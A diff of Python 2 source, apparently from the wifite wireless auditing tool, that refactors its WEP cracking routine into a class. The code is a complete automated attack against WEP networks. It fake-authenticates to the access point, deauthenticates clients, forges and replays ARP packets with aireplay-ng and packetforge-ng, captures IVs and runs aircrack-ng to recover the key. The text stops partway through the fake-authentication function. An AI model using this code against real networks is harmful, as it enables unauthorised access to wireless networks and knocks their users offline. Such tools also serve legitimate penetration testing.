-    """
+class WEPAttack:
+    def attack_wep(self, iface, target, clients):
+        """
         Attacks WEP-encrypted network.
         Returns True if key was successfully found, False otherwise.
-    """
-    global RUN_CONFIG
-    if RUN_CONFIG.WEP_TIMEOUT <= 0: RUN_CONFIG.WEP_TIMEOUT = -1
+        """
+        global RUN_CONFIG
+        if RUN_CONFIG.WEP_TIMEOUT <= 0: RUN_CONFIG.WEP_TIMEOUT = -1
     
-    total_attacks = 6 # 4 + (2 if len(clients) > 0 else 0)
-    if not RUN_CONFIG.WEP_ARP_REPLAY: total_attacks -= 1
-    if not RUN_CONFIG.WEP_CHOPCHOP:   total_attacks -= 1
-    if not RUN_CONFIG.WEP_FRAGMENT:   total_attacks -= 1
-    if not RUN_CONFIG.WEP_CAFFELATTE: total_attacks -= 1
-    if not RUN_CONFIG.WEP_P0841:      total_attacks -= 1
-    if not RUN_CONFIG.WEP_HIRTE:      total_attacks -= 1
+        total_attacks = 6 # 4 + (2 if len(clients) > 0 else 0)
+        if not RUN_CONFIG.WEP_ARP_REPLAY: total_attacks -= 1
+        if not RUN_CONFIG.WEP_CHOPCHOP:   total_attacks -= 1
+        if not RUN_CONFIG.WEP_FRAGMENT:   total_attacks -= 1
+        if not RUN_CONFIG.WEP_CAFFELATTE: total_attacks -= 1
+        if not RUN_CONFIG.WEP_P0841:      total_attacks -= 1
+        if not RUN_CONFIG.WEP_HIRTE:      total_attacks -= 1
     
-    if total_attacks <= 0:
-        print R+' [!]'+O+' unable to initiate WEP attacks: no attacks are selected!'
-        return False
-    remaining_attacks = total_attacks
+        if total_attacks <= 0:
+            print R+' [!]'+O+' unable to initiate WEP attacks: no attacks are selected!'
+            return False
+        remaining_attacks = total_attacks
     
-    print ' %s preparing attack "%s" (%s)' % \
+        print ' %s preparing attack "%s" (%s)' % \
                (GR+sec_to_hms(RUN_CONFIG.WEP_TIMEOUT)+W, G+target.ssid+W, G+target.bssid+W)
     
-    interrupted_count = 0
+        interrupted_count = 0
     
-    remove_airodump_files(RUN_CONFIG.temp + 'wep')
-    remove_file(RUN_CONFIG.temp + 'wepkey.txt')
+        remove_airodump_files(RUN_CONFIG.temp + 'wep')
+        remove_file(RUN_CONFIG.temp + 'wepkey.txt')
     
-    # Start airodump process to capture packets
-    cmd_airodump = ['airodump-ng',
+        # Start airodump process to capture packets
+        cmd_airodump = ['airodump-ng',
            '-w', RUN_CONFIG.temp + 'wep',      # Output file name (wep-01.cap, wep-01.csv)
            '-c', target.channel,    # Wireless channel
            '--bssid', target.bssid,
            iface]
-    proc_airodump = Popen(cmd_airodump, stdout=DN, stderr=DN)
-    proc_aireplay = None
-    proc_aircrack = None
+        proc_airodump = Popen(cmd_airodump, stdout=DN, stderr=DN)
+        proc_aireplay = None
+        proc_aircrack = None
     
-    successful       = False # Flag for when attack is successful
-    started_cracking = False # Flag for when we have started aircrack-ng
-    client_mac       = ''    # The client mac we will send packets to/from
+        successful       = False # Flag for when attack is successful
+        started_cracking = False # Flag for when we have started aircrack-ng
+        client_mac       = ''    # The client mac we will send packets to/from
     
-    total_ivs = 0
-    ivs = 0
-    last_ivs = 0
-    for attack_num in xrange(0, 6):
+        total_ivs = 0
+        ivs = 0
+        last_ivs = 0
+        for attack_num in xrange(0, 6):
         
-        # Skip disabled attacks
-        if   attack_num == 0 and not RUN_CONFIG.WEP_ARP_REPLAY: continue
-        elif attack_num == 1 and not RUN_CONFIG.WEP_CHOPCHOP:   continue
-        elif attack_num == 2 and not RUN_CONFIG.WEP_FRAGMENT:   continue
-        elif attack_num == 3 and not RUN_CONFIG.WEP_CAFFELATTE: continue
-        elif attack_num == 4 and not RUN_CONFIG.WEP_P0841:      continue
-        elif attack_num == 5 and not RUN_CONFIG.WEP_HIRTE:      continue
+            # Skip disabled attacks
+            if   attack_num == 0 and not RUN_CONFIG.WEP_ARP_REPLAY: continue
+            elif attack_num == 1 and not RUN_CONFIG.WEP_CHOPCHOP:   continue
+            elif attack_num == 2 and not RUN_CONFIG.WEP_FRAGMENT:   continue
+            elif attack_num == 3 and not RUN_CONFIG.WEP_CAFFELATTE: continue
+            elif attack_num == 4 and not RUN_CONFIG.WEP_P0841:      continue
+            elif attack_num == 5 and not RUN_CONFIG.WEP_HIRTE:      continue
         
-        remaining_attacks -= 1
+            remaining_attacks -= 1
         
-        try:
-            
-            if wep_fake_auth(iface, target, sec_to_hms(RUN_CONFIG.WEP_TIMEOUT)):
-                # Successful fake auth
-                client_mac = RUN_CONFIG.THIS_MAC
-            elif not RUN_CONFIG.WEP_IGNORE_FAKEAUTH: 
-                send_interrupt(proc_aireplay)
-                send_interrupt(proc_airodump)
-                print R+' [!]'+O+' unable to fake-authenticate with target'
-                print R+' [!]'+O+' to skip this speed bump, select "ignore-fake-auth" at command-line'
-                return False
-            
-            remove_file(RUN_CONFIG.temp + 'arp.cap')
-            # Generate the aireplay-ng arguments based on attack_num and other params
-            cmd = get_aireplay_command(iface, attack_num, target, clients, client_mac)
-            if cmd == '': continue
-            proc_aireplay = Popen(cmd, stdout=DN, stderr=DN)
-            
-            print '\r %s attacking "%s" via' % (GR+sec_to_hms(RUN_CONFIG.WEP_TIMEOUT)+W, G+target.ssid+W),
-            if attack_num == 0:   print G+'arp-replay',
-            elif attack_num == 1: print G+'chop-chop',
-            elif attack_num == 2: print G+'fragmentation',
-            elif attack_num == 3: print G+'caffe-latte',
-            elif attack_num == 4: print G+'p0841',
-            elif attack_num == 5: print G+'hirte',
-            print 'attack'+W
-            
-            print ' %s captured %s%d%s ivs @ %s iv/sec' % (GR+sec_to_hms(RUN_CONFIG.WEP_TIMEOUT)+W, G, total_ivs, W, G+'0'+W),
-            stdout.flush()
-            
-            time.sleep(1)
-            if attack_num == 1:
-                # Send a deauth packet to broadcast and all clients *just because!*
-                wep_send_deauths(iface, target, clients)
-            last_deauth = time.time()
-            
-            replaying = False
-            time_started = time.time()
-            while time.time() - time_started < RUN_CONFIG.WEP_TIMEOUT:
-                # time.sleep(5)
-                for time_count in xrange(0, 6):
-                    if RUN_CONFIG.WEP_TIMEOUT == -1:
-                        current_hms = "[endless]"
-                    else: 
-                        current_hms = sec_to_hms(RUN_CONFIG.WEP_TIMEOUT - (time.time() - time_started))
-                    print "\r %s\r" % (GR+current_hms+W),
-                    stdout.flush()
-                    time.sleep(1)
-                    
-                # Calculates total seconds remaining
+            try:
                 
-                # Check number of IVs captured
-                csv = parse_csv(RUN_CONFIG.temp + 'wep-01.csv')[0]
-                if len(csv) > 0:
-                    ivs = int(csv[0].data)
-                    print "\r                                                   ",
-                    print "\r %s captured %s%d%s ivs @ %s%d%s iv/sec" % \
-                              (GR+current_hms+W, G, total_ivs + ivs, W, G, (ivs - last_ivs) / 5, W),
-                    
-                    if ivs - last_ivs == 0 and time.time() - last_deauth > 30:
-                        print "\r %s deauthing to generate packets..." % (GR+current_hms+W),
-                        wep_send_deauths(iface, target, clients)
-                        print "done\r",
-                        last_deauth = time.time()
-                    
-                    last_ivs = ivs
-                    stdout.flush()
-                    if total_ivs + ivs >= RUN_CONFIG.WEP_CRACK_AT_IVS and not started_cracking:
-                        # Start cracking
-                        cmd = ['aircrack-ng',
-                               '-a', '1',
-                               '-l', RUN_CONFIG.temp + 'wepkey.txt']
-                               #temp + 'wep-01.cap']
-                        # Append all .cap files in temp directory (in case we are resuming)
-                        for f in os.listdir(RUN_CONFIG.temp):
-                            if f.startswith('wep-') and f.endswith('.cap'):
-                                cmd.append(RUN_CONFIG.temp + f)
-
-                        print "\r %s started %s (%sover %d ivs%s)" % (GR+current_hms+W, G+'cracking'+W, G, RUN_CONFIG.WEP_CRACK_AT_IVS, W)
-                        proc_aircrack = Popen(cmd, stdout=DN, stderr=DN)
-                        started_cracking = True
-                
-                # Check if key has been cracked yet.
-                if os.path.exists(RUN_CONFIG.temp + 'wepkey.txt'):
-                    # Cracked!
-                    infile = open(RUN_CONFIG.temp + 'wepkey.txt', 'r')
-                    key = infile.read().replace('\n', '')
-                    infile.close()
-                    print '\n\n %s %s %s (%s)! key: "%s"' % (current_hms, G+'cracked', target.ssid+W, G+target.bssid+W, C+key+W)
-                    RUN_CONFIG.WEP_FINDINGS.append('cracked %s (%s), key: "%s"' % (target.ssid, target.bssid, key))
-                    RUN_CONFIG.WEP_FINDINGS.append('')
-                    
-                    t = Target(target.bssid, 0, 0, 0, 'WEP', target.ssid)
-                    t.key = key
-                    RUN_CONFIG.save_cracked(t)
-                    
-                    # Kill processes
-                    send_interrupt(proc_airodump)
+                if self.wep_fake_auth(iface, target, sec_to_hms(RUN_CONFIG.WEP_TIMEOUT)):
+                    # Successful fake auth
+                    client_mac = RUN_CONFIG.THIS_MAC
+                elif not RUN_CONFIG.WEP_IGNORE_FAKEAUTH: 
                     send_interrupt(proc_aireplay)
-                    try: os.kill(proc_aireplay, SIGTERM)
-                    except: pass
-                    send_interrupt(proc_aircrack)
-                    # Remove files generated by airodump/aireplay/packetforce
-                    time.sleep(0.5)
-                    remove_airodump_files(RUN_CONFIG.temp + 'wep')
-                    remove_file(RUN_CONFIG.temp + 'wepkey.txt')
-                    return True
-                
-                # Check if aireplay is still executing
-                if proc_aireplay.poll() == None: 
-                    if replaying: print ', '+G+'replaying         \r'+W,
-                    elif attack_num == 1 or attack_num == 2: print ', waiting for packet    \r',
-                    stdout.flush()
-                    continue
-                
-                # At this point, aireplay has stopped
-                if attack_num != 1 and attack_num != 2:
-                    print '\r %s attack failed: %saireplay-ng exited unexpectedly%s' % (R+current_hms, O, W)
-                    break # Break out of attack's While loop
-                
-                # Check for a .XOR file (we expect one when doing chopchop/fragmentation
-                xor_file = ''
-                for filename in sorted(os.listdir(RUN_CONFIG.temp)):
-                    if filename.lower().endswith('.xor'): xor_file = RUN_CONFIG.temp + filename
-                if xor_file == '':
-                    print '\r %s attack failed: %sunable to generate keystream        %s' % (R+current_hms, O, W)
-                    break
-                
+                    send_interrupt(proc_airodump)
+                    print R+' [!]'+O+' unable to fake-authenticate with target'
+                    print R+' [!]'+O+' to skip this speed bump, select "ignore-fake-auth" at command-line'
+                    return False
+            
                 remove_file(RUN_CONFIG.temp + 'arp.cap')
-                cmd = ['packetforge-ng',
-                         '-0',
-                         '-a', target.bssid,
-                         '-h', client_mac,
-                         '-k', '192.168.1.2',
-                         '-l', '192.168.1.100',
-                         '-y', xor_file,
-                         '-w', RUN_CONFIG.temp + 'arp.cap',
-                         iface]
-                proc_pforge = Popen(cmd, stdout=PIPE, stderr=DN)
-                proc_pforge.wait()
-                forged_packet = proc_pforge.communicate()[0]
-                remove_file(xor_file)
-                if forged_packet == None: result = ''
-                forged_packet = forged_packet.strip()
-                if not forged_packet.find('Wrote packet'):
-                    print "\r %s attack failed: unable to forget ARP packet               %s" % (R+current_hms+O, W)
-                    break
-                
-                # We were able to forge a packet, so let's replay it via aireplay-ng
-                cmd = ['aireplay-ng',
-                       '--ignore-negative-one',
-                       '--arpreplay',
-                       '-b', target.bssid,
-                       '-r', RUN_CONFIG.temp + 'arp.cap', # Used the forged ARP packet
-                       '-F', # Select the first packet
-                       iface]
+                # Generate the aireplay-ng arguments based on attack_num and other params
+                cmd = self.get_aireplay_command(iface, attack_num, target, clients, client_mac)
+                if cmd == '': continue
                 proc_aireplay = Popen(cmd, stdout=DN, stderr=DN)
                 
-                print '\r %s forged %s! %s...         ' % (GR+current_hms+W, G+'arp packet'+W, G+'replaying'+W)
-                replaying = True
-        
-            # After the attacks, if we are already cracking, wait for the key to be found!
-            while started_cracking: # ivs > WEP_CRACK_AT_IVS:
-                time.sleep(5)
-                # Check number of IVs captured
-                csv = parse_csv(RUN_CONFIG.temp + 'wep-01.csv')[0]
-                if len(csv) > 0:
-                    ivs = int(csv[0].data)
-                    print GR+" [endless]"+W+" captured %s%d%s ivs, iv/sec: %s%d%s  \r" % \
-                                             (G, total_ivs + ivs, W, G, (ivs - last_ivs) / 5, W),
-                    last_ivs = ivs
-                    stdout.flush()
+                print '\r %s attacking "%s" via' % (GR+sec_to_hms(RUN_CONFIG.WEP_TIMEOUT)+W, G+target.ssid+W),
+                if attack_num == 0:   print G+'arp-replay',
+                elif attack_num == 1: print G+'chop-chop',
+                elif attack_num == 2: print G+'fragmentation',
+                elif attack_num == 3: print G+'caffe-latte',
+                elif attack_num == 4: print G+'p0841',
+                elif attack_num == 5: print G+'hirte',
+                print 'attack'+W
+            
+                print ' %s captured %s%d%s ivs @ %s iv/sec' % (GR+sec_to_hms(RUN_CONFIG.WEP_TIMEOUT)+W, G, total_ivs, W, G+'0'+W),
+                stdout.flush()
+            
+                time.sleep(1)
+                if attack_num == 1:
+                    # Send a deauth packet to broadcast and all clients *just because!*
+                    self.wep_send_deauths(iface, target, clients)
+                last_deauth = time.time()
+            
+                replaying = False
+                time_started = time.time()
+                while time.time() - time_started < RUN_CONFIG.WEP_TIMEOUT:
+                    # time.sleep(5)
+                    for time_count in xrange(0, 6):
+                        if RUN_CONFIG.WEP_TIMEOUT == -1:
+                            current_hms = "[endless]"
+                        else: 
+                            current_hms = sec_to_hms(RUN_CONFIG.WEP_TIMEOUT - (time.time() - time_started))
+                        print "\r %s\r" % (GR+current_hms+W),
+                        stdout.flush()
+                        time.sleep(1)
+                    
+                    # Calculates total seconds remaining
                 
-                # Check if key has been cracked yet.
-                if os.path.exists(RUN_CONFIG.temp + 'wepkey.txt'):
-                    # Cracked!
-                    infile = open(RUN_CONFIG.temp + 'wepkey.txt', 'r')
-                    key = infile.read().replace('\n', '')
-                    infile.close()
-                    print GR+'\n\n [endless] %s %s (%s)! key: "%s"' % (G+'cracked', target.ssid+W, G+target.bssid+W, C+key+W)
-                    RUN_CONFIG.WEP_FINDINGS.append('cracked %s (%s), key: "%s"' % (target.ssid, target.bssid, key))
-                    RUN_CONFIG.WEP_FINDINGS.append('')
+                    # Check number of IVs captured
+                    csv = parse_csv(RUN_CONFIG.temp + 'wep-01.csv')[0]
+                    if len(csv) > 0:
+                        ivs = int(csv[0].data)
+                        print "\r                                                   ",
+                        print "\r %s captured %s%d%s ivs @ %s%d%s iv/sec" % \
+                                  (GR+current_hms+W, G, total_ivs + ivs, W, G, (ivs - last_ivs) / 5, W),
                     
-                    t = Target(target.bssid, 0, 0, 0, 'WEP', target.ssid)
-                    t.key = key
-                    RUN_CONFIG.save_cracked(t)
+                        if ivs - last_ivs == 0 and time.time() - last_deauth > 30:
+                            print "\r %s deauthing to generate packets..." % (GR+current_hms+W),
+                            self.wep_send_deauths(iface, target, clients)
+                            print "done\r",
+                            last_deauth = time.time()
                     
-                    # Kill processes
-                    send_interrupt(proc_airodump)
+                        last_ivs = ivs
+                        stdout.flush()
+                        if total_ivs + ivs >= RUN_CONFIG.WEP_CRACK_AT_IVS and not started_cracking:
+                            # Start cracking
+                            cmd = ['aircrack-ng',
+                                   '-a', '1',
+                                   '-l', RUN_CONFIG.temp + 'wepkey.txt']
+                                   #temp + 'wep-01.cap']
+                            # Append all .cap files in temp directory (in case we are resuming)
+                            for f in os.listdir(RUN_CONFIG.temp):
+                                if f.startswith('wep-') and f.endswith('.cap'):
+                                    cmd.append(RUN_CONFIG.temp + f)
+
+                            print "\r %s started %s (%sover %d ivs%s)" % (GR+current_hms+W, G+'cracking'+W, G, RUN_CONFIG.WEP_CRACK_AT_IVS, W)
+                            proc_aircrack = Popen(cmd, stdout=DN, stderr=DN)
+                            started_cracking = True
+                
+                    # Check if key has been cracked yet.
+                    if os.path.exists(RUN_CONFIG.temp + 'wepkey.txt'):
+                        # Cracked!
+                        infile = open(RUN_CONFIG.temp + 'wepkey.txt', 'r')
+                        key = infile.read().replace('\n', '')
+                        infile.close()
+                        print '\n\n %s %s %s (%s)! key: "%s"' % (current_hms, G+'cracked', target.ssid+W, G+target.bssid+W, C+key+W)
+                        RUN_CONFIG.WEP_FINDINGS.append('cracked %s (%s), key: "%s"' % (target.ssid, target.bssid, key))
+                        RUN_CONFIG.WEP_FINDINGS.append('')
+                    
+                        t = Target(target.bssid, 0, 0, 0, 'WEP', target.ssid)
+                        t.key = key
+                        RUN_CONFIG.save_cracked(t)
+                    
+                        # Kill processes
+                        send_interrupt(proc_airodump)
+                        send_interrupt(proc_aireplay)
+                        try: os.kill(proc_aireplay, SIGTERM)
+                        except: pass
+                        send_interrupt(proc_aircrack)
+                        # Remove files generated by airodump/aireplay/packetforce
+                        time.sleep(0.5)
+                        remove_airodump_files(RUN_CONFIG.temp + 'wep')
+                        remove_file(RUN_CONFIG.temp + 'wepkey.txt')
+                        return True
+                
+                    # Check if aireplay is still executing
+                    if proc_aireplay.poll() == None: 
+                        if replaying: print ', '+G+'replaying         \r'+W,
+                        elif attack_num == 1 or attack_num == 2: print ', waiting for packet    \r',
+                        stdout.flush()
+                        continue
+                
+                    # At this point, aireplay has stopped
+                    if attack_num != 1 and attack_num != 2:
+                        print '\r %s attack failed: %saireplay-ng exited unexpectedly%s' % (R+current_hms, O, W)
+                        break # Break out of attack's While loop
+                
+                    # Check for a .XOR file (we expect one when doing chopchop/fragmentation
+                    xor_file = ''
+                    for filename in sorted(os.listdir(RUN_CONFIG.temp)):
+                        if filename.lower().endswith('.xor'): xor_file = RUN_CONFIG.temp + filename
+                    if xor_file == '':
+                        print '\r %s attack failed: %sunable to generate keystream        %s' % (R+current_hms, O, W)
+                        break
+                
+                    remove_file(RUN_CONFIG.temp + 'arp.cap')
+                    cmd = ['packetforge-ng',
+                             '-0',
+                             '-a', target.bssid,
+                             '-h', client_mac,
+                             '-k', '192.168.1.2',
+                             '-l', '192.168.1.100',
+                             '-y', xor_file,
+                             '-w', RUN_CONFIG.temp + 'arp.cap',
+                             iface]
+                    proc_pforge = Popen(cmd, stdout=PIPE, stderr=DN)
+                    proc_pforge.wait()
+                    forged_packet = proc_pforge.communicate()[0]
+                    remove_file(xor_file)
+                    if forged_packet == None: result = ''
+                    forged_packet = forged_packet.strip()
+                    if not forged_packet.find('Wrote packet'):
+                        print "\r %s attack failed: unable to forget ARP packet               %s" % (R+current_hms+O, W)
+                        break
+                
+                    # We were able to forge a packet, so let's replay it via aireplay-ng
+                    cmd = ['aireplay-ng',
+                           '--ignore-negative-one',
+                           '--arpreplay',
+                           '-b', target.bssid,
+                           '-r', RUN_CONFIG.temp + 'arp.cap', # Used the forged ARP packet
+                           '-F', # Select the first packet
+                           iface]
+                    proc_aireplay = Popen(cmd, stdout=DN, stderr=DN)
+                
+                    print '\r %s forged %s! %s...         ' % (GR+current_hms+W, G+'arp packet'+W, G+'replaying'+W)
+                    replaying = True
+        
+                # After the attacks, if we are already cracking, wait for the key to be found!
+                while started_cracking: # ivs > WEP_CRACK_AT_IVS:
+                    time.sleep(5)
+                    # Check number of IVs captured
+                    csv = parse_csv(RUN_CONFIG.temp + 'wep-01.csv')[0]
+                    if len(csv) > 0:
+                        ivs = int(csv[0].data)
+                        print GR+" [endless]"+W+" captured %s%d%s ivs, iv/sec: %s%d%s  \r" % \
+                                                 (G, total_ivs + ivs, W, G, (ivs - last_ivs) / 5, W),
+                        last_ivs = ivs
+                        stdout.flush()
+                
+                    # Check if key has been cracked yet.
+                    if os.path.exists(RUN_CONFIG.temp + 'wepkey.txt'):
+                        # Cracked!
+                        infile = open(RUN_CONFIG.temp + 'wepkey.txt', 'r')
+                        key = infile.read().replace('\n', '')
+                        infile.close()
+                        print GR+'\n\n [endless] %s %s (%s)! key: "%s"' % (G+'cracked', target.ssid+W, G+target.bssid+W, C+key+W)
+                        RUN_CONFIG.WEP_FINDINGS.append('cracked %s (%s), key: "%s"' % (target.ssid, target.bssid, key))
+                        RUN_CONFIG.WEP_FINDINGS.append('')
+                    
+                        t = Target(target.bssid, 0, 0, 0, 'WEP', target.ssid)
+                        t.key = key
+                        RUN_CONFIG.save_cracked(t)
+                    
+                        # Kill processes
+                        send_interrupt(proc_airodump)
+                        send_interrupt(proc_aireplay)
+                        send_interrupt(proc_aircrack)
+                        # Remove files generated by airodump/aireplay/packetforce
+                        remove_airodump_files(RUN_CONFIG.temp + 'wep')
+                        remove_file(RUN_CONFIG.temp + 'wepkey.txt')
+                        return True
+            
+            # Keyboard interrupt during attack
+            except KeyboardInterrupt:
+                print R+'\n (^C)'+O+' WEP attack interrupted\n'+W
+            
+                send_interrupt(proc_airodump)
+                if proc_aireplay != None:
                     send_interrupt(proc_aireplay)
+                if proc_aircrack != None:
                     send_interrupt(proc_aircrack)
+            
+                options = []
+                selections = []
+                if remaining_attacks > 0:
+                    options.append('%scontinue%s attacking this target (%d remaining WEP attack%s)' % \
+                                            (G, W, (remaining_attacks), 's' if remaining_attacks != 1 else ''))
+                    selections.append(G+'c'+W)
+                
+                if RUN_CONFIG.TARGETS_REMAINING > 0:
+                    options.append('%sskip%s     this target, move onto next target (%d remaining target%s)' % \
+                                        (O, W, RUN_CONFIG.TARGETS_REMAINING, 's' if RUN_CONFIG.TARGETS_REMAINING != 1 else ''))
+                    selections.append(O+'s'+W)
+                
+                options.append('%sexit%s     the program completely' % (R, W))
+                selections.append(R+'e'+W)
+            
+                if len(options) > 1:
+                    # Ask user what they want to do, Store answer in "response"
+                    print GR+' [+]'+W+' what do you want to do?'
+                    response = ''
+                    while response != 'c' and response != 's' and response != 'e':
+                        for option in options:
+                            print '     %s' % option
+                        response = raw_input(GR+' [+]'+W+' please make a selection (%s): ' % (', '.join(selections))).lower()[0]
+                else:
+                    response = 'e'
+            
+                if response == 'e' or response == 's':
+                    # Exit or skip target (either way, stop this attack)
+                    if RUN_CONFIG.WEP_SAVE:
+                        # Save packets
+                        save_as = re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '_' + target.bssid.replace(':', '-') + '.cap'+W
+                        try:            rename(RUN_CONFIG.temp + 'wep-01.cap', save_as)
+                        except OSError: print R+' [!]'+O+' unable to save capture file!'+W
+                        else:           print GR+' [+]'+W+' packet capture '+G+'saved'+W+' to '+G+save_as+W
+                
                     # Remove files generated by airodump/aireplay/packetforce
+                    for filename in os.listdir('.'):
+                        if filename.startswith('replay_arp-') and filename.endswith('.cap'):
+                            remove_file(filename)
                     remove_airodump_files(RUN_CONFIG.temp + 'wep')
                     remove_file(RUN_CONFIG.temp + 'wepkey.txt')
-                    return True
-            
-        # Keyboard interrupt during attack
-        except KeyboardInterrupt:
-            print R+'\n (^C)'+O+' WEP attack interrupted\n'+W
-            
-            send_interrupt(proc_airodump)
-            if proc_aireplay != None:
-                send_interrupt(proc_aireplay)
-            if proc_aircrack != None:
-                send_interrupt(proc_aircrack)
-            
-            options = []
-            selections = []
-            if remaining_attacks > 0:
-                options.append('%scontinue%s attacking this target (%d remaining WEP attack%s)' % \
-                                        (G, W, (remaining_attacks), 's' if remaining_attacks != 1 else ''))
-                selections.append(G+'c'+W)
+                    print ''
+                    if response == 'e':
+                        exit_gracefully(0)
+                    return
                 
-            if RUN_CONFIG.TARGETS_REMAINING > 0:
-                options.append('%sskip%s     this target, move onto next target (%d remaining target%s)' % \
-                                        (O, W, RUN_CONFIG.TARGETS_REMAINING, 's' if RUN_CONFIG.TARGETS_REMAINING != 1 else ''))
-                selections.append(O+'s'+W)
+                elif response == 'c':
+                    # Continue attacks
+                    # Need to backup temp/wep-01.cap and remove airodump files
+                    i= 2
+                    while os.path.exists(RUN_CONFIG.temp + 'wep-' + str(i) + '.cap'):
+                        i += 1
+                    copy(RUN_CONFIG.temp + "wep-01.cap", RUN_CONFIG.temp + 'wep-' + str(i) + '.cap')
+                    remove_airodump_files(RUN_CONFIG.temp + 'wep')
+                    
+                    # Need to restart airodump-ng, as it's been interrupted/killed
+                    proc_airodump = Popen(cmd_airodump, stdout=DN, stderr=DN)
                 
-            options.append('%sexit%s     the program completely' % (R, W))
-            selections.append(R+'e'+W)
-            
-            if len(options) > 1:
-                # Ask user what they want to do, Store answer in "response"
-                print GR+' [+]'+W+' what do you want to do?'
-                response = ''
-                while response != 'c' and response != 's' and response != 'e':
-                    for option in options:
-                        print '     %s' % option
-                    response = raw_input(GR+' [+]'+W+' please make a selection (%s): ' % (', '.join(selections))).lower()[0]
-            else:
-                response = 'e'
-            
-            if response == 'e' or response == 's':
-                # Exit or skip target (either way, stop this attack)
-                if RUN_CONFIG.WEP_SAVE:
-                    # Save packets
-                    save_as = re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '_' + target.bssid.replace(':', '-') + '.cap'+W
-                    try:            rename(RUN_CONFIG.temp + 'wep-01.cap', save_as)
-                    except OSError: print R+' [!]'+O+' unable to save capture file!'+W
-                    else:           print GR+' [+]'+W+' packet capture '+G+'saved'+W+' to '+G+save_as+W
+                    # Say we haven't started cracking yet, so we re-start if needed.
+                    started_cracking = False
                 
-                # Remove files generated by airodump/aireplay/packetforce
-                for filename in os.listdir('.'):
-                    if filename.startswith('replay_arp-') and filename.endswith('.cap'):
-                        remove_file(filename)
-                remove_airodump_files(RUN_CONFIG.temp + 'wep')
-                remove_file(RUN_CONFIG.temp + 'wepkey.txt')
-                print ''
-                if response == 'e':
-                    exit_gracefully(0)
-                return
+                    # Reset IVs counters for proper behavior
+                    total_ivs += ivs
+                    ivs = 0
+                    last_ivs = 0
                 
-            elif response == 'c':
-                # Continue attacks
-                # Need to backup temp/wep-01.cap and remove airodump files
-                i = 2
-                while os.path.exists(RUN_CONFIG.temp + 'wep-' + str(i) + '.cap'):
-                    i += 1
-                copy(RUN_CONFIG.temp + "wep-01.cap", RUN_CONFIG.temp + 'wep-' + str(i) + '.cap')
-                remove_airodump_files(RUN_CONFIG.temp + 'wep')
-                
-                # Need to restart airodump-ng, as it's been interrupted/killed
-                proc_airodump = Popen(cmd_airodump, stdout=DN, stderr=DN)
-                
-                # Say we haven't started cracking yet, so we re-start if needed.
-                started_cracking = False
-                
-                # Reset IVs counters for proper behavior
-                total_ivs += ivs
-                ivs = 0
-                last_ivs = 0
-                
-                # Also need to remember to crack "temp/*.cap" instead of just wep-01.cap
-                pass
+                    # Also need to remember to crack "temp/*.cap" instead of just wep-01.cap
+                    pass
             
         
-    if successful:
-        print GR+'\n [0:00:00]'+W+' attack complete: '+G+'success!'+W
-    else:
-        print GR+'\n [0:00:00]'+W+' attack complete: '+R+'failure'+W
+        if successful:
+            print GR+'\n [0:00:00]'+W+' attack complete: '+G+'success!'+W
+        else:
+            print GR+'\n [0:00:00]'+W+' attack complete: '+R+'failure'+W
     
-    send_interrupt(proc_airodump)
-    if proc_aireplay != None:
-        send_interrupt(proc_aireplay)
+        send_interrupt(proc_airodump)
+        if proc_aireplay != None:
+            send_interrupt(proc_aireplay)
     
-    # Remove files generated by airodump/aireplay/packetforce
-    for filename in os.listdir('.'):
-        if filename.startswith('replay_arp-') and filename.endswith('.cap'):
-            remove_file(filename)
-    remove_airodump_files(RUN_CONFIG.temp + 'wep')
-    remove_file(RUN_CONFIG.temp + 'wepkey.txt')
+        # Remove files generated by airodump/aireplay/packetforce
+        for filename in os.listdir('.'):
+            if filename.startswith('replay_arp-') and filename.endswith('.cap'):
+                remove_file(filename)
+        remove_airodump_files(RUN_CONFIG.temp + 'wep')
+        remove_file(RUN_CONFIG.temp + 'wepkey.txt')
 
 
-def wep_fake_auth(iface, target, time_to_display):
-    """
-        Attempt to (falsely) authenticate with a WEP access point.
-        Gives 3 seconds to make each 5 authentication attempts.
-        Returns True if authentication was successful, False otherwise.
-    """
-    max_wait = 3 # Time, in seconds, to allow each fake authentication
-    max_attempts = 5 # Number of attempts to make
-    
-    for fa_index in xrange(1, max_attempts + 1):
-        print '\r                                                            ',
-        print '\r %s attempting %sfake authentication%s (%d/%d)... ' % \
-               (GR+time_to_display+W, G, W, fa_index, max_attempts),
-        stdout.flush()
+    def wep_fake_auth(self, iface, target, time_to_display):
+        """
+            Attempt to (falsely) authenticate with a WEP access point.
+            Gives 3 seconds to make each 5 authentication attempts.
+            Returns True if authentication was successful, False otherwise.
+        """
+        max_wait = 3 # Time, in seconds, to allow each fake authentication
+        max_attempts = 5 # Number of attempts to make
+       
+        for fa_index in xrange(1, max_attempts + 1):
+            print '\r                                                            ',
+            print '\r %s attempting %sfake authentication%s (%d/%d)... ' % \
+                   (GR+time_to_display+W, G, W, fa_index, max_attempts),
+            stdout.flush()
         
-        cmd = ['aireplay-ng',
-               '--ignore-negative-one',
-               '-1', '0', # Fake auth, no delay
-               '-a', target.bssid,
-               '-T', '1'] # Make 1 attempt
-        if target.ssid != '':
-            cmd.append('-e')
-            cmd.append(target.ssid)
-        cmd.append(iface)
+            cmd = ['aireplay-ng',
+                   '--ignore-negative-one',
+                   '-1', '0', # Fake auth, no delay
+                   '-a', target.bssid,
+                   '-T', '1'] # Make 1 attempt
+            if target.ssid != '':
+                cmd.append('-e')
+                cmd.append(target.ssid)
+            cmd.append(iface)
         
-        proc_fakeauth = Popen(cmd, stdout=PIPE, stderr=DN)
-        started = time.time()
-        while proc_fakeauth.poll() == None and time.time() - started <= max_wait: pass
-        if time.time() - started > max_wait:
-            send_interrupt(proc_fakeauth)
+            proc_fakeauth = Popen(cmd, stdout=PIPE, stderr=DN)
+            started = time.time()
+            while proc_fakeauth.poll() == None and time.time() - started <= max_wait: pass
+            if time.time() - started > max_wait:
+                send_interrupt(proc_fakeauth)
+                print R+'failed'+W,
+                stdout.flush()
+                time.sleep(0.5)
+                continue
+        
+            result = proc_fakeauth.communicate()[0].lower()
+            if result.find('switching to shared key') != -1 or \
+                 result.find('rejects open system'): pass
+                 # TODO Shared Key Authentication (SKA)
+            if result.find('association successful') != -1:
+                print G+'success!'+W
+                return True
+        
             print R+'failed'+W,
             stdout.flush()
             time.sleep(0.5)
             continue
-        
-        result = proc_fakeauth.communicate()[0].lower()
-        if result.find('switching to shared key') != -1 or \
-             result.find('rejects open system'): pass
-             # TODO Shared Key Authentication (SKA)
-        if result.find('association successful') != -1:
-            print G+'success!'+W
